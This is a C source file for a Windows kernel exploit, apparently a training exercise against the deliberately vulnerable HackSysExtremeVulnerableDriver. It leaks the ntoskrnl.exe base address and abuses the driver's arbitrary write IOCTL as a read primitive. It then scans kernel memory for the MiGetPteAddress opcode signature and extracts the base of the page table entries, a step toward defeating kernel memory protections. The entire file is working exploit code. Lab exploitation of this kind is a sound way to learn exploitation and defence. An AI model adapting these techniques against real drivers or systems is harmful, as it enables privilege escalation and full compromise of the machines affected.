#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL_CODE 0x0022200B

unsigned long long kernelBase(void)
{
	// Defining EnumDeviceDrivers() parameters
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;

	// Calling EnumDeviceDrivers()
	printf("[+] Calling EnumDeviceDrivers()...\n");

	BOOL baseofDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	// Error handling
	if (!baseofDrivers)
	{
		printf("[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n", GetLastError());
		exit(1);
	}

	// ntoskrnl.exe is the first module dumped in the array
	// Typcasting LPVOID to unsigned long long
	unsigned long long krnlBase = (unsigned long long)lpImageBase[0];

	// Print update for kernel base
	printf("[+] Found kernel leak!\n");
	printf("[+] ntoskrnl.exe is located at: 0x%llx\n", krnlBase);

	return krnlBase;
}

// nt!MiGetPteAddress and nt!MiInitializeTransitionPfn+0x37 have the same routine
// This function dereferences all of the memory in ntoskrnl.exe via a one QWORD vanilla arbitrary read/write primitive and looks for the opcodes that make up these functions
// The base of the PTEs in each function are at the same offset of 0x13 from the beginning of the routine
unsigned long long findpteBase(void)
{
	// Return value of ntoskrnl.exe here
	unsigned long long baseAddress = kernelBase();

	// Defining variable for pointer to ntoskrnl.exe base address
	unsigned long long temporaryVariable = baseAddress;
	PULONGLONG kernelPointer = &temporaryVariable;

	// Defining variable to write the current address of ntoskrnl.exe into (0x1 byte at a time)
	unsigned long long temporaryVariable2 = NULL;
	PULONGLONG dereferencedContents = &temporaryVariable2;

	// Defining vairable to dereference the current ntoskrnl.exe address for the opcodes
	unsigned long long temporaryVariable3 = NULL;
	PULONGLONG checkSignature = &temporaryVariable3;

	// Defining buffer for looping ntoskrnl.exe
	char buf[0x10];
	size_t oneQword = 0x8;

	// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
	memset(buf, 0x41, 0x10);
	memcpy(buf, &kernelPointer, oneQword);
	memcpy(&buf[0x8], &dereferencedContents, oneQword);

	// Defining buffer for dereferencing memory and searching for the nt!MiGetPteAddress signature
	char buf1[0x10];

	/*
	0: kd> u nt!MiGetPteAddress
		nt!MiGetPteAddress:
		fffff800`ef2255f4 48c1e909        shr     rcx,9
		fffff800`ef2255f8 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
		fffff800`ef225602 4823c8          and     rcx,rax
		fffff800`ef225605 48b80000000000f5ffff mov rax,0FFFFF50000000000h
		fffff800`ef22560f 4803c1          add     rax,rcx
		fffff800`ef225612 c3              ret
		fffff800`ef225613 cc              int     3
		fffff800`ef225614 cc              int     3
	0: kd> u nt!MiInitializeTransitionPfn+0x37
		fffff801`d1a88937 48c1e909        shr     rcx,9
		fffff801`d1a8893b 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
		fffff801`d1a88945 4823c8          and     rcx,rax
		fffff801`d1a88948 48b80000000000f5ffff mov rax,0FFFFF50000000000h
		fffff801`d1a88952 4803c8          add     rcx,rax
		fffff801`d1a88955 e89ed90200      call    nt!MI_READ_PDE (fffff801`d1ab62f8)
		fffff801`d1a8895a 488d4c2450      lea     rcx,[rsp+50h]
		fffff801`d1a8895f 4889442450      mov     qword ptr [rsp+50h],rax
	*/
	unsigned long long miSignature = 0xfff8b84809e9c148;

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	// Obtaining handle to the driver
	printf("[+] Obtaining handle to the driver via CreateFileA()...\n");
	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Loop ntoskrnl.exe
	// ntoskrnl.exe ~ 0x80000 bytes
	for (int i = 0; i < 0x80000; i++)
	{
		// Extract current address of ntoskrnl.exe (0x1 byte at a time increase) to dereferencedContents
		DeviceIoControl(
			drvHandle,
			IOCTL_CODE,
			buf,
			sizeof(buf),
			NULL,
			0,
			&lpBytesReturned,
			NULL
		);

		// Actual extraction of the current memory address in ntoskrnl.exe being checked
		unsigned long long temporaryVariable4 = *dereferencedContents;

		// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
		memset(buf1, 0x41, 0x10);
		memcpy(buf1, &temporaryVariable4, oneQword);
		memcpy(&buf1[0x8], &checkSignature, oneQword);

		// Extract opcodes from current address in ntoskrnl.exe to prepare signature check
		DeviceIoControl(
			drvHandle,
			IOCTL_CODE,
			buf1,
			sizeof(buf1),
			NULL,
			0,
			&lpBytesReturned,
			NULL
		);

		// Dereference contents of arbitrary write to extract current address
		unsigned long long miCheck = *checkSignature;

		if (miCheck == miSignature)
		{
			unsigned long long mitemporaryAddress = temporaryVariable4;
			unsigned long long miAddress = mitemporaryAddress + 0x13;
			printf("[+] Found either nt!MiGetPteAddress or nt!MiInitializeTransitionPfn+0x37!\n");
			printf("[+] The address 0x%llx points to the base of the page table entries!\n", miAddress);

			return miAddress;
		}
		else
		{
			// Didn't find the intended address? Increase the current address one byte
			temporaryVariable++;
		}
	}

	// We aren't passing our handle to the driver to the next function, so close it
	CloseHandle(
		drvHandle
	);
}

// Extract PTE base, create shellcode, calculate PTE of shellcode, extract PTE control bits, 
void exploitWork(void)
{
	// Store pointer to PTEs in holdPtes variable
	unsigned long long ptePointer = findpteBase();

	// Create variable + pointer to extract base of the PTEs
	unsigned long long temporaryVariable5 = NULL;
	PULONGLONG pteExtract = &temporaryVariable5;

	// Defining buffer for looping ntoskrnl.exe
	char buf2[0x10];
	size_t oneQword = 0x8;

	// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
	memset(buf2, 0x41, 0x10);
	memcpy(buf2, &ptePointer, oneQword);
	memcpy(&buf2[0x8], &pteExtract, oneQword);

	// Open handle again to the driver
	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	// Send buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf2,
		sizeof(buf2),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Extract PTE base
	unsigned long long pteBase = *pteExtract;

	// Print update
	printf("[+] Successfully extracted the base of the page table entries!\n");
	printf("[+] The base of the PTEs are located at: 0x%llx\n", pteBase);
}

int main(void)
{
	exploitWork();
}
